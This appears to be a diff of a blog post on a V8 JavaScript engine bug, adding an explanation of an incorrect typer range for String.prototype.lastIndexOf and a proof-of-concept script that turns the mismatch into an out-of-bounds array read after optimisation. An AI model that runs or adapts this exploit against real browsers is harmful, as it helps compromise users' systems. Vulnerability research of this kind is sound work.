@@ -66,7 +66,7 @@ Setup fetch v8 git reset --hard 8cd4009c5b7072ad224f19a9e668ec0ed7430599 gclient
   <title>clock</title>
   <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
 </svg>
-          5 min read
+          6 min read
         </div>
       </div>
     </header>
@@ -259,8 +259,29 @@ In this case <code>left_type.Max() &lt; right_type.Min()</code> is always false.
 <ol>
 <li>In simplified lowering <code>checkbounds</code> node doesn&rsquo;t get eliminated instead <code>kAbortOnOutOfBounds</code> mode is set and lowered to the <code>CheckUint32Bounds</code>.</li>
 <li><code>CheckUint32Bounds</code> node then lowered to <code>Uint32LessThan</code> node in <code>EffectControlLinearizer</code>.</li>
-<li></li>
+<li>The typer calculates the incorrect range for <code>kStringPrototypeLastIndexOf</code> i.e., <code>return Type::Range(-1.0, String::kMaxLength - 1.0, t-&gt;zone());</code> instead of <code>return Type::Range(-1.0, String::kMaxLength, t-&gt;zone());</code></li>
 </ol>
+<p>Poc Writing Steps:</p>
+<ol>
+<li>First we&rsquo;ll create a <code>string</code> which is of length <code>kMaxLength = 1073741799</code></li>
+<li>Then we&rsquo;ll try to get last index of the <code>string</code> which should return <code>1073741799</code> in actual. But at this point typer thinks that it&rsquo;s in range <code>Range(-1.0, 1073741798)</code></li>
+<li>Now we&rsquo;ll modify returned value <code>1073741799</code> in such a way that it would not be <code>0</code> but the typer assumed value <code>1073741798</code> would be <code>0</code> or less than the <code>right_type.Min()</code> but <code>0</code> would be best.</li>
+</ol>
+<p>Let&rsquo;s begin:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">str</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;aaaaaaa&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;xpldotjs&#34;</span>.<span style="color:#a6e22e">repeat</span>(<span style="color:#ae81ff">134217724</span>); <span style="color:#75715e">// [1]
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">trigger</span>() {
+	<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">idx</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">str</span>.<span style="color:#a6e22e">lastIndexOf</span>(<span style="color:#e6db74">&#39;&#39;</span>); <span style="color:#75715e">// typer: Range(-1, 1073741798), actual: (-1, 1073741799)
+</span><span style="color:#75715e"></span>	<span style="color:#a6e22e">idx</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">idx</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">25</span>;   <span style="color:#75715e">// [2]: typer: 1073741798 + 25 = 1073741823, actual: 1073741799 + 25 = 1073741824
+</span><span style="color:#75715e"></span>	<span style="color:#a6e22e">idx</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">idx</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">30</span>;  <span style="color:#75715e">// [3]: typer: 1073741823 &gt;&gt; 30 = 0, actual: 1073741824 &gt;&gt; 30 = 1
+</span><span style="color:#75715e"></span>	<span style="color:#a6e22e">idx</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">idx</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>;    <span style="color:#75715e">// [4]: typer: 0 * 4 = 0, actual: 1 * 4 = 4
+</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">arr</span> <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1.1</span>,<span style="color:#ae81ff">1.2</span>]; <span style="color:#75715e">// [5] oob
+</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">arr</span>[<span style="color:#a6e22e">idx</span>];
+}
+
+<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">trigger</span>());
+<span style="color:#f92672">%</span><span style="color:#a6e22e">OptimizeFunctionOnNextCall</span>(<span style="color:#a6e22e">trigger</span>);
+<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">trigger</span>());
+</code></pre></div><p>In the POC, we created a string with length <code>1073741799</code> [1].</p>
 
     </div>
     <div class="post-footer">
